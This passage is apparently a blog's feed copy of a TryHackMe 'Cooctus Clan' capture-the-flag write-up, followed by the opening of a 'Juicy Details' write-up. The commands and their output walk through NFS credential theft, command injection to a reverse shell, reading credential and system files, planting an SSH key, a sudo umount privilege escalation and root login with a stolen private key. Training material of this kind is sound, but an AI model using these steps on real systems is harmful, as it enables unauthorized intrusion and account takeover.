|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34481/tcp6  mountd
|   100005  1,2,3      37413/udp6  mountd
|   100005  1,2,3      43347/udp   mountd
|   100005  1,2,3      56545/tcp   mountd
|   100021  1,3,4      34901/tcp6  nlockmgr
|   100021  1,3,4      46744/udp   nlockmgr
|   100021  1,3,4      46749/tcp   nlockmgr
|   100021  1,3,4      60804/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH on 22 open&lt;/li&gt;
&lt;li&gt;HTTP on 8080 open&lt;/li&gt;
&lt;li&gt;NFS on 2049 open&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;p&gt;Doing a basic enumeration, we get the pages: &lt;code&gt;/cat&lt;/code&gt; and &lt;code&gt;/login&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;The home page:
&lt;img src=&#34;https://i.imgur.com/pgzfND2.jpg&#34; alt=&#34;home page of the cooctus clan room on THM&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The login page:
&lt;img src=&#34;https://i.imgur.com/voWl8s8.png&#34; alt=&#34;login page of the cooctus clan&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I tried some basic SQLI attacks, but they did not work. Recall that we had the 2049 port open with NFS running. Let&amp;rsquo;s explore that first then.&lt;/p&gt;
&lt;h3 id=&#34;14-nfs&#34;&gt;1.4. NFS&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s see what all do we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ showmount --exports 10.10.80.121
Export list for 10.10.80.121:
/var/nfs/general *
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Amazing! Looks like we can get something. Follow the steps to mount shares using NFS service:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Go to &lt;code&gt;/tmp&lt;/code&gt; on your machine. (Or wherever you want. I prefer &lt;code&gt;/tmp&lt;/code&gt;.)&lt;/li&gt;
&lt;li&gt;Make a directory where the files of the other system would be mounted. Call it whatever you want.&lt;/li&gt;
&lt;li&gt;Mount the shares using &lt;code&gt;sudo mount --type nfs&lt;/code&gt;. Make sure to sudo!&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ /tmp

┌──(kali㉿kali)-[/tmp]
└─$ mkdir general

┌──(kali㉿kali)-[/tmp]
└─$ sudo mount --type nfs 10.10.80.121:/var/nfs/general general
[sudo] password for kali: 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have successfully mounted the files shared using NFS. Let&amp;rsquo;s explore them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cd general   
                    
┌──(kali㉿kali)-[/tmp/general]
└─$ ls
credentials.bak                                                                   
┌──(kali㉿kali)-[/tmp/general]
└─$ cat credentials.bak                  
{username}
{password was here *nom* *nom* sorry what?}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we get the credentials for the login!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;h3 id=&#34;21-getting-rce&#34;&gt;2.1. Getting RCE&lt;/h3&gt;
&lt;p&gt;We finally get in. We see a page where we can put payload.
&lt;img src=&#34;https://i.imgur.com/kU7J7xv.png&#34; alt=&#34;the cat page of the thm room&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It took me a lot of experimentation and time to get RCE. Here&amp;rsquo;s what I figured.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Whatever you put in the payload gets echo-ed exactly as is, on the resultant page.&lt;/li&gt;
&lt;li&gt;There may be php or python3 or whatever program running.&lt;/li&gt;
&lt;li&gt;What if the input is not sanitised? How about using &amp;ldquo;;&amp;rdquo;?&lt;/li&gt;
&lt;li&gt;Trying out wow&amp;quot;; echo &amp;ldquo;bruh&amp;rdquo; - does not work.&lt;/li&gt;
&lt;li&gt;Checking for more, I get this page: &lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-community/attacks/Command_Injection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OWASP Command Injection&lt;/a&gt;, how about &amp;ldquo;|&amp;rdquo; in the list?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I use reverse shells from &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Reverse Shell Generator&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/74SNzh2.png&#34; alt=&#34;Getting remote code execution (RCE)&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;BONUS:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I tried other revshells: bash and the mkfifo one. Did not work.&lt;/li&gt;
&lt;li&gt;I tried using &lt;code&gt;&amp;amp;&lt;/code&gt; and &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;. Also did not work.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;22-exploring&#34;&gt;2.2. Exploring&lt;/h3&gt;
&lt;p&gt;I like to check a couple of things when I first get in any machine:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What all users exist?&lt;/li&gt;
&lt;li&gt;All files having SUID bits set&lt;/li&gt;
&lt;li&gt;crontab&lt;/li&gt;
&lt;li&gt;Kernel version&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;users&#34;&gt;Users&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ cd /home
cd /home
$ ls
ls
paradox  szymex  tux  varg
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;suid-bits&#34;&gt;SUID bits&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ bash -i
bash -i
paradox@cchq:/home$ find / -type f -perm -u=s 2&amp;gt; /dev/null
find / -type f -perm -u=s 2&amp;gt; /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/home/varg/CooctOS.py
/bin/ping
/bin/mount
/bin/su
/bin/umount
/bin/fusermount
/sbin/mount.nfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;One of them pops out!&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;paradox@cchq:/home$ ls -la /home/varg/CooctOS.py
ls -la /home/varg/CooctOS.py
-rwsrws--x 1 varg varg 2146 Feb 20 22:05 /home/varg/CooctOS.py
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;kernel-version&#34;&gt;Kernel Version&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;paradox@cchq:~$ uname -a
uname -a
Linux cchq 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upto date.&lt;/p&gt;
&lt;h4 id=&#34;crontab&#34;&gt;crontab&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;paradox@cchq:~$ cat /etc/crontab  
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
* *     * * *   szymex  /home/szymex/SniffingCat.py
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Last line looks &lt;em&gt;very&lt;/em&gt; interesting.&lt;/p&gt;
&lt;h3 id=&#34;23-info-gathered&#34;&gt;2.3. Info Gathered&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/home/szymex/SniffingCat.py&lt;/code&gt; is running every minute, by the user szymex&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/home/varg/CooctOS.py&lt;/code&gt; has SUID set
Okay. We are ready for PrivEscs.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;h3 id=&#34;31-szymex&#34;&gt;3.1. szymex&lt;/h3&gt;
&lt;p&gt;Exploring inside szy, we get a file called &lt;code&gt;note_to_para&lt;/code&gt; and &lt;code&gt;SniffingCat.py&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;paradox@cchq:/home/szymex$ cat note_to_para
cat note_to_para
Paradox,

I&#39;m testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like szy has some password there. Let&amp;rsquo;s open it up.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;paradox@cchq:/home/szymex$ cat SniffingCat.py
cat SniffingCat.py
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = &#39;&#39;
    for i in pwd:
        if ord(i) &amp;gt; 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = &amp;quot;Approximate location of an upcoming Dr.Pepper shipment found:&amp;quot;
coords = &amp;quot;Coordinates: X: {x}, Y: {y}, Z: {z}&amp;quot;.format(x=x, y=y, z=z)

with open(&#39;/home/szymex/mysupersecretpassword.cat&#39;, &#39;r&#39;) as f:
    line = f.readline().rstrip(&amp;quot;\n&amp;quot;)
    enc_pw = encode(line)
    if enc_pw == &amp;quot;{encoded_password_was_here_mmm}&amp;quot;:
        os.system(&amp;quot;wall -g paradox &amp;quot; + message)
        os.system(&amp;quot;wall -g paradox &amp;quot; + coords)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What&amp;rsquo;s happening here?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every minute (for eternity) the above script is run&lt;/li&gt;
&lt;li&gt;The script opens a &lt;code&gt;mysupersecretpassword.cat&lt;/code&gt; file and checks if the thing put in can be encoded to be same.&lt;/li&gt;
&lt;li&gt;We need to find the string that encodes as the above. Python3 scripting time!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here&amp;rsquo;s what I came up with:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;import string


def encode(pwd):
    enc = &amp;quot;&amp;quot;
    for i in pwd:
        if ord(i) &amp;gt; 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


ans = &amp;quot;&amp;quot;
for c in &amp;quot;{yee_haww}&amp;quot;:
    save = None
    for x in string.printable:
        save = x
        if encode(x) == c:
            break
    ans += save
print(ans)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After cracking this, maybe we can try directly sudo-ing into &lt;code&gt;szymex&lt;/code&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;paradox@cchq:~$ su szymex
su szymex
Password:

szymex@cchq:/home/paradox$ cd ~
cd ~
szymex@cchq:~$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Works!&lt;/p&gt;
&lt;h3 id=&#34;32-tux&#34;&gt;3.2. tux&lt;/h3&gt;
&lt;p&gt;I was stuck here for a bit, before I tried &lt;code&gt;id&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szymex@cchq:~$ id
id
uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;testers&lt;/code&gt; looks intersting. Let&amp;rsquo;s see what all do we have.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szymex@cchq:/home/varg$ find / -type f -group testers 2&amp;gt; /dev/null
find / -type f -group testers 2&amp;gt; /dev/null
/home/tux/tuxling_3/note
/home/tux/tuxling_1/nootcode.c
/home/tux/tuxling_1/note
/media/tuxling_2/private.key
/media/tuxling_2/note
/media/tuxling_2/fragment.asc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Woah. That&amp;rsquo;s a lotta files. Going through them,&lt;/p&gt;
&lt;p&gt;Note 3:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: {wow3}

Combine them all and visit the station.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note 1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT &amp;quot;{hidden}&amp;quot;
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT &amp;quot;NOOT!\n&amp;quot;
#define nooOT &amp;quot;{hidden}&amp;quot;
#define noOT printf
#define nOOT 0
#define nOoOoT &amp;quot;What does the penguin say?\n&amp;quot;
#define nout &amp;quot;{hidden}&amp;quot;

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Its C code, with a lot of #s. Compiling, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ./a.out
What does the penguin say?
NOOT!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not helpful. Although, looking at the source more closely, we can see some hex strings. They are in the line which I have translated below.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;... printf *** **** *** ; ...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We get the first string!&lt;/p&gt;
&lt;p&gt;Note 2:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szymex@cchq:/home/varg$ cat /media/tuxling_2/note
cat /media/tuxling_2/note
Noot noot! You found me. 
I&#39;m Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I&#39;ve encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like we are looking at a pgp key.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szymex@cchq:~$ file /media/tuxling_2/fragment.asc
file /media/tuxling_2/fragment.asc
/media/tuxling_2/fragment.asc: PGP message Public-Key Encrypted Session Key (old)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I initially tried breaking it, but then I saw the &lt;code&gt;/media/tuxling_2/private.key&lt;/code&gt; file. Import the key and we are done!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szymex@cchq:~$ file /media/tuxling_2/fragment.asc
file /media/tuxling_2/fragment.asc
/media/tuxling_2/fragment.asc: PGP message Public-Key Encrypted Session Key (old)

szymex@cchq:~$ gpg --import /media/tuxling_2/private.key
gpg --import /media/tuxling_2/private.key
gpg: key B70EB31F8EF3187C: public key &amp;quot;TuxPingu&amp;quot; imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
szymex@cchq:~$ gpg --decrypt /media/tuxling_2/fragment.asc
gpg --decrypt /media/tuxling_2/fragment.asc
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      &amp;quot;TuxPingu&amp;quot;
The second key fragment is: {wow2}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have all the fragments now! But now what? I tried breaking the cipher, but it didn&amp;rsquo;t work. What if it were a hash instead? Going to &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CrackStation&lt;/a&gt; we get the cracked hash!&lt;/p&gt;
&lt;h3 id=&#34;33-varg&#34;&gt;3.3 varg&lt;/h3&gt;
&lt;p&gt;In this user I saw a &lt;code&gt;.ssh&lt;/code&gt; folder. Good news! Here&amp;rsquo;s how to ssh into the tux user.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Go to ~/.ssh on your machine&lt;/li&gt;
&lt;li&gt;Get your id_rsa.pub&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo &amp;quot;{your_id_rsa.pub here} &amp;gt; authorized_keys&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SSH in!&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
└─$ ssh tux@10.10.59.77                     
The authenticity of host &#39;10.10.59.77 (10.10.59.77)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:7/RM1nMYqyZHC8ICXMcPUC3vIVlZuQab39ZsXs9Q+NI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.59.77&#39; (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 23 06:55:44 UTC 2021

  System load:  0.08               Processes:           118
  Usage of /:   35.2% of 18.57GB   Users logged in:     0
  Memory usage: 66%                IP address for eth0: 10.10.59.77
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 of these updates are security updates.


Last login: Mon Feb 22 18:43:28 2021
tux@cchq:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Exploring a bit, we see -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tux@cchq:/home/varg/cooctOS_src/games$ cat note
Hey Varg! 

I&#39;ve created a little game called Adventure. 
If you like it, we could ship it with the OS when it&#39;s ready :)

- Tux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Game was nice (i got the easter egg too XD). But now what? There was a &lt;code&gt;.git&lt;/code&gt; directory that I missed. Checking it out, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tux@cchq:/home/varg/cooctOS_src$ git log
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -&amp;gt; master)
Author: Vargles &amp;lt;varg@cchq.noot&amp;gt;
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

commit 6919df5c171460507f69769bc20e19bd0838b74d
Author: Vargles &amp;lt;varg@cchq.noot&amp;gt;
Date:   Sat Feb 20 15:46:28 2021 +0000

    Created git repo for CooctOS
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Maybe something was hidden in the later commits? Let&amp;rsquo;s see the diff.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+print(&amp;quot;CooctOS 13.3.7 LTS cookie tty1&amp;quot;)
+uname = input(&amp;quot;\ncookie login: &amp;quot;)
+pw = input(&amp;quot;Password: &amp;quot;)
+
+for i in range(0,2):
+    if pw != &amp;quot;{woah_not_so_fast_copy_cat_man}&amp;quot;:
+        pw = input(&amp;quot;Password: &amp;quot;)
+    else:
+        if uname == &amp;quot;varg&amp;quot;:
+            os.setuid(1002)
+            os.setgid(1002)
+            pty.spawn(&amp;quot;/bin/rbash&amp;quot;)
+            break
+        else:
+            print(&amp;quot;Login Failed&amp;quot;)
+            break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah yes! We get the creds.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tux@cchq:/home/varg/cooctOS_src$ su varg
Password: 
varg@cchq:~/cooctOS_src$ cd ~
varg@cchq:~$
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;34-root&#34;&gt;3.4. root&lt;/h3&gt;
&lt;p&gt;I checked the sudo permissions:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GTFOBins only mentioned that of &lt;code&gt;/bin/mount&lt;/code&gt; and not &lt;code&gt;/bin/umount&lt;/code&gt;. What next? Realise that we may have something intersting mounted :D&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;varg@cchq:~$ df -ha
...

/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.6G   12G  38% /opt/CooctFS
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&amp;rsquo;s what happened:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;df reports file system disk space usage&lt;/li&gt;
&lt;li&gt;-h flag is human readable, because we did&lt;/li&gt;
&lt;li&gt;-a flag which displays everything&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Going in however, we see only:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;varg@cchq:/dev/mapper$ cd /opt/CooctFS
varg@cchq:/opt/CooctFS$ ls
bin  boot  etc  games  lib  run  tmp  var
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Its the same as what we saw before. But hold up! Recall the &lt;code&gt;sudo&lt;/code&gt; permissions to umount? Let&amp;rsquo;s do it!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;varg@cchq:/opt/CooctFS$ sudo umount /opt/CooctFS
umount: /opt/CooctFS: target is busy.
varg@cchq:/opt/CooctFS$ cd /
varg@cchq:/$ sudo umount /opt/CooctFS
varg@cchq:/$ cd -
/opt/CooctFS
varg@cchq:/opt/CooctFS$ ls
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Wait what happened here?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We were allowed to run &lt;code&gt;sudo /bin/umount&lt;/code&gt; or just &lt;code&gt;sudo umount&lt;/code&gt; &lt;em&gt;without&lt;/em&gt; a password&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;/opt/CooctFS/root/&lt;/code&gt; folder existed in the &lt;code&gt;/opt/CooctFS/&lt;/code&gt; folder &lt;em&gt;beforehand&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;We were not able to see this because there was the other stuff listed out, which in effect, &lt;em&gt;hid&lt;/em&gt; the &lt;code&gt;/root/&lt;/code&gt; directory till we lifted the mount.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can explore more on the &lt;a class=&#34;link&#34; href=&#34;https://linux.die.net/man/8/mount&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;linux mount&lt;/a&gt; what &lt;strong&gt;exactly&lt;/strong&gt; was happening. Look for the &lt;code&gt;bind&lt;/code&gt; keyword! Thanks to @crazyjointje for the explaination and myiops#2207 for pointing out the &lt;code&gt;bind&lt;/code&gt; functionality (#room-hints, TryHackMe Discord).&lt;/p&gt;
&lt;p&gt;Nice. Let&amp;rsquo;s see the contents -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;varg@cchq:/opt/CooctFS$ cd root/
varg@cchq:/opt/CooctFS/root$ ls -la
total 28
drwxr-xr-x 5 root root 4096 Feb 20 09:16 .
drwxr-xr-x 3 root root 4096 Feb 20 09:09 ..
lrwxrwxrwx 1 root root    9 Feb 20 09:15 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc
drwx------ 3 root root 4096 Feb 20 09:09 .cache
drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local
-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
varg@cchq:/opt/CooctFS/root$ cat root.txt
hmmm...
No flag here. You aren&#39;t root yet.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But &amp;hellip; we have the &lt;code&gt;.ssh&lt;/code&gt; folder. Do you know dear reader, what that means? We can login as root! &lt;code&gt;cat&lt;/code&gt; the &lt;code&gt;id_rsa&lt;/code&gt; private key, copypaste it on your system&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@10.10.59.77
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 23 07:25:01 UTC 2021

  System load:  0.08               Processes:           125
  Usage of /:   35.2% of 18.57GB   Users logged in:     1
  Memory usage: 63%                IP address for eth0: 10.10.59.77
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
root@cchq:~# 

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip; we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Juicy Details Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-juicy-details-writeup/</link>
        <pubDate>Sat, 19 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-juicy-details-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/7NQjTHj.png" alt="Featured image of post TryHackMe: Juicy Details Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/juicydetails&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;task-1-reconnaissance&#34;&gt;Task 1. Reconnaissance&lt;/h2&gt;
&lt;h4 id=&#34;what-tools-did-the-attacker-use-order-by-the-occurrence-in-the-log&#34;&gt;What tools did the attacker use? (Order by the occurrence in the log)&lt;/h4&gt;
&lt;p&gt;Explore the file &lt;code&gt;access.log&lt;/code&gt;. We see the following, in order:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nmap&lt;/li&gt;
&lt;li&gt;hydra&lt;/li&gt;
&lt;li&gt;sqlmap&lt;/li&gt;
&lt;li&gt;curl&lt;/li&gt;
&lt;li&gt;feroxbuster&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Check the last part of the line. For example, the hydra tool uses the &lt;code&gt;(Hydra)&lt;/code&gt; marker at the end. sqlmap similarly has &lt;code&gt;(http://sqlmap.org)&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;what-endpoint-was-vulnerable-to-a-brute-force-attack&#34;&gt;What endpoint was vulnerable to a brute-force attack?&lt;/h4&gt;
&lt;p&gt;In &lt;code&gt;access.log&lt;/code&gt; we check the endpoint where Hydra is being used.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/rest/user/login&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;what-endpoint-was-vulnerable-to-sql-injection&#34;&gt;What endpoint was vulnerable to SQL injection?&lt;/h4&gt;
&lt;p&gt;Similar to above, we look for user-agents specified as sqlmap.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/rest/products/search&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;what-parameter-was-used-for-the-sql-injection&#34;&gt;What parameter was used for the SQL injection?&lt;/h4&gt;
